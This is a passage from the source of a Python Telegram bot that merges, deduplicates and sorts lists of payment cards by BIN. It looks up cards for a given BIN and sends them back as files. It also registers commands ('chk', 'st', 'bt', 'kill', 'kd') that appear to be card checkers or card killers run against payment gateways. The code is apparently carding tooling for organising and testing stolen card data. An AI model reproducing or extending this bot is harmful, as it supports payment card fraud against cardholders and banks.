            # Sort by BIN (first 6 digits)
            unique_lines.sort(key=lambda x: x[:6] if len(x) >= 6 else x)
        else:
            # Regular alphabetical sort
            unique_lines.sort()
        
        # Create output
        merged_content = '\n'.join(unique_lines)
        file_bytes = merged_content.encode('utf-8')
        file_size_mb = len(file_bytes) / (1024 * 1024)
        
        # Generate filename
        timestamp = int(time.time())
        filename = f"merged_{len(files)}files_{len(unique_lines)}lines_{timestamp}.txt"
        
        caption = (
            f"📎 Merged File\n\n"
            f"📁 Files merged: {len(files)}\n"
            f"📄 Original lines: {original_count:,}\n"
            f"♻️ Duplicates removed: {duplicates_removed:,}\n"
            f"✅ Final lines: {len(unique_lines):,}\n"
            f"{'🃏 Sorted by BIN' if cards_detected > 50 else '🔤 Sorted alphabetically'}"
        )
        
        # Send the merged file - use smart sender for large files
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=filename,
            caption=caption
        )
        
        # Clear session
        del context.user_data[merge_key]
        
        await query.edit_message_text(
            f"✅ Merge complete!\n\n"
            f"📁 {len(files)} files merged\n"
            f"♻️ {duplicates_removed:,} duplicates removed\n"
            f"✅ {len(unique_lines):,} unique lines"
        )

# ==== 14. Text Message Handler for Bin Search ====
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for bin search in /clean and /filter commands"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Check if user is in /filter bin search mode
    filter_key = f"filter_search_{user_id}"
    if filter_key in context.user_data:
        session_id = context.user_data[filter_key]
        del context.user_data[filter_key]
        
        if session_id not in _filter_sessions:
            await update.message.reply_text("❌ Session expired. Run /filter again.", reply_to_message_id=update.message.message_id)
            return
        
        # Extract BIN
        bin_match = re.search(r'(\d{6})', text)
        if not bin_match:
            await update.message.reply_text("❌ Invalid BIN. Send 6 digits.", reply_to_message_id=update.message.message_id)
            return
        
        bin_num = bin_match.group(1)
        session = _filter_sessions[session_id]
        cards = session['data']['by_bin'].get(bin_num, [])
        
        if not cards:
            info_str, details = get_bin_info(bin_num)
            flag = (details or {}).get("country_flag", "")
            await update.message.reply_text(
                f"🔍 BIN {bin_num} not found in your data.\n\n💳 {info_str} {flag}",
                reply_to_message_id=update.message.message_id
            )
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        file_bytes = content.encode('utf-8')
        info_str, details = get_bin_info(bin_num)
        flag = (details or {}).get("country_flag", "")
        
        await send_large_document(
            bot=context.bot,
            chat_id=update.message.chat.id,
            content=file_bytes,
            filename=f"bin_{bin_num}_{len(cards)}.txt",
            caption=f"🏦 BIN: {bin_num} {flag}\n📊 Cards: {len(cards)}\n💳 {info_str}",
            reply_to=update.message.message_id
        )
        return
    
    # Check if user is in /clean bin search mode
    session_key = f"bin_search_session_{user_id}"
    if session_key in context.user_data:
        session_id = context.user_data[session_key]
        
        # Remove the session key
        del context.user_data[session_key]
        
        # Check if session still exists
        if session_id not in context.user_data:
            await update.message.reply_text("❌ Session expired. Please run /clean again.", reply_to_message_id=update.message.message_id)
            return
        
        session_data = context.user_data[session_id]
        organized_data = session_data['organized']
        
        # Extract BIN from text (first 6 digits)
        bin_match = re.search(r'(\d{6})', text)
        if not bin_match:
            await update.message.reply_text("❌ Invalid BIN format. Please provide 6 digits.", reply_to_message_id=update.message.message_id)
            return
        
        bin_num = bin_match.group(1)
        
        # Get cards for this BIN
        cards = organized_data['by_bin'].get(bin_num, [])
        
        if not cards:
            # Try to get bin info
            bin_info_str, bin_details = get_bin_info(bin_num)
            flag = (bin_details or {}).get("country_flag", "")
            info_line = f"Info: {bin_info_str}{(' ' + flag) if flag else ''}"
            await update.message.reply_text(
                f"🔍 BIN `{bin_num}` not found in your cleaned data.\n\n{info_line}",
                reply_to_message_id=update.message.message_id,
            )
            return
        
        # Create file with cards for this BIN
        file_content = "\n".join([card['formatted'] for card in cards])
        file_bytes = file_content.encode('utf-8')
        file_name = f"bin_{bin_num}_{int(time.time())}.txt"
        
        # Get bin info
        bin_info_str, bin_details = get_bin_info(bin_num)
        flag = (bin_details or {}).get("country_flag", "")
        info_line = f"🏦 Info: {bin_info_str}{(' ' + flag) if flag else ''}"
        
        caption = (
            f"🔍 BIN: {bin_num}\n"
            f"📁 Cards: {len(cards):,}\n"
            f"{info_line}\n"
            f"👤 User: {session_data['username']}"
        )
        
        try:
            success = await send_large_document(
                bot=context.bot,
                chat_id=update.message.chat.id,
                content=file_bytes,
                filename=file_name,
                caption=caption,
                reply_to=update.message.message_id
            )
            if not success:
                await update.message.reply_text(
                    f"⚠️ File too large. Set API_ID/API_HASH for large file support.",
                    reply_to_message_id=update.message.message_id
                )
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending file: {str(e)[:100]}", reply_to_message_id=update.message.message_id)

# ==== 15. Dispatcher Entry Point ====
def _start_health_server_if_needed() -> None:
    """
    Railway "web" services expect the process to bind to $PORT.
    This bot uses long-polling, so we start a tiny built-in HTTP server for health checks.
    """
    port_raw = os.environ.get("PORT")
    if not port_raw:
        return

    try:
        port = int(port_raw)
    except ValueError:
        print(f"⚠️ Invalid PORT value: {port_raw!r} (skipping health server)")
        return

    if port <= 0:
        return

    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            if self.path in ("/", "/health", "/healthz"):
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            self.send_response(404)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"not found")

        def log_message(self, format, *args):  # noqa: A002
            # Keep logs clean on Railway
            return

    class ReusableThreadingHTTPServer(ThreadingHTTPServer):
        allow_reuse_address = True

    try:
        server = ReusableThreadingHTTPServer(("0.0.0.0", port), Handler)
    except OSError as e:
        print(f"⚠️ Failed to bind health server on 0.0.0.0:{port}: {e}")
        return

    thread = threading.Thread(target=server.serve_forever, name="health-server", daemon=True)
    thread.start()
    print(f"✅ Health server listening on 0.0.0.0:{port}")


async def main():
    # Ensure helpers/subprocesses always see the resolved token
    global BOT_TOKEN
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("❌ BOT_TOKEN environment variable is required")
        return
    BOT_TOKEN = token

    _start_health_server_if_needed()

    # Load BIN databases once at startup
    load_bin_databases()

    async def _error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        # Prevent PTB from printing "No error handlers are registered" with full trace spam.
        try:
            err = getattr(context, "error", None)
            msg = str(err) if err else "unknown"
            print(f"⚠️ Handler error: {msg[:200]}")
        except Exception:
            pass

    # If polling crashes (network hiccups, Telegram issues, etc.), restart without recursion.
    net_backoff = 5.0
    while True:
        # Railway Pro optimizations: Better concurrency and timeout settings
        app = (
            ApplicationBuilder()
            .token(token)
            .concurrent_updates(True)  # Handle multiple users simultaneously
            .connect_timeout(30.0)
            .read_timeout(30.0)
            .write_timeout(30.0)
            .pool_timeout(30.0)
            .get_updates_connect_timeout(30.0)
            .get_updates_read_timeout(30.0)
            .get_updates_pool_timeout(30.0)
            .build()
        )

        # Basic commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("cmds", cmds_cmd))
        app.add_handler(CommandHandler("id", id_cmd))
        app.add_handler(CommandHandler("bin", bin_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("health", health_cmd))
        app.add_handler(CommandHandler("version", version_cmd))
        app.add_handler(CommandHandler("ver", version_cmd))
        app.add_handler(CommandHandler("sort", sort_cmd))
        app.add_handler(CommandHandler("clean", clean_cmd))
        app.add_handler(CommandHandler("filter", filter_cmd))
        app.add_handler(CommandHandler("split", split_cmd))
        app.add_handler(CommandHandler("jork", jork_cmd))
        app.add_handler(CommandHandler("merge", merge_cmd))

        # New commands
        app.add_handler(CommandHandler("site", site_cmd))

        # Callback handlers - FIXED PATTERNS with shorter prefixes
        app.add_handler(CallbackQueryHandler(sort_callback, pattern="^s_"))
        app.add_handler(CallbackQueryHandler(clean_callback, pattern="^c_"))
        app.add_handler(CallbackQueryHandler(filter_callback, pattern="^f_"))
        app.add_handler(CallbackQueryHandler(merge_callback, pattern="^merge_"))

        # Admin commands
        app.add_handler(CommandHandler("approve", approve))
        app.add_handler(CommandHandler("unapprove", unapprove))
        app.add_handler(CommandHandler("remove", remove))
        app.add_handler(CommandHandler("ban", ban))
        app.add_handler(CommandHandler("unban", unban))
        app.add_handler(CommandHandler("on", on_cmd))
        app.add_handler(CommandHandler("off", off_cmd))
        app.add_handler(CommandHandler("ram", ram_cmd))
        app.add_handler(CommandHandler("cleanram", cleanram_cmd))
        app.add_handler(CommandHandler("backup", backup_cmd))
        app.add_handler(CommandHandler("log", log_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))

        # Register error handler to reduce noisy stack traces in logs
        app.add_error_handler(_error_handler)

        # Auth commands
        app.add_handler(CommandHandler("kill", kill_cmd))
        app.add_handler(CommandHandler("kd", kd_cmd))
        app.add_handler(CommandHandler("ko", ko_cmd))
        app.add_handler(CommandHandler("zz", zz_cmd))
        app.add_handler(CommandHandler("dd", dd_cmd))
        app.add_handler(CommandHandler("st", st_cmd))
        app.add_handler(CommandHandler("bt", bt_cmd))
        app.add_handler(CommandHandler("chk", chk_cmd))

        # Text message handler for bin search
        from telegram.ext import MessageHandler, filters

        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

        print("🤖 Bot is running...")
        print(f"✅ Loaded {len(bin_cache)} BINs from database")

        try:
            await app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            return
        except Exception as e:
            # Network errors to Telegram happen in containers; back off a bit.
            if isinstance(e, (NetworkError, TimedOut)):
                wait_s = min(120.0, net_backoff + random.random() * 2.0)
                print(f"⚠️ Bot polling network error: {str(e)[:120]} (sleep {wait_s:.1f}s)")
                await asyncio.sleep(wait_s)
                net_backoff = min(120.0, net_backoff * 1.6 + 1.0)
                continue

            net_backoff = 5.0
            print(f"❌ Bot polling error: {e}")
            await asyncio.sleep(5)
            print("🔄 Restarting bot polling...")

if __name__ == "__main__":
    asyncio.run(main())
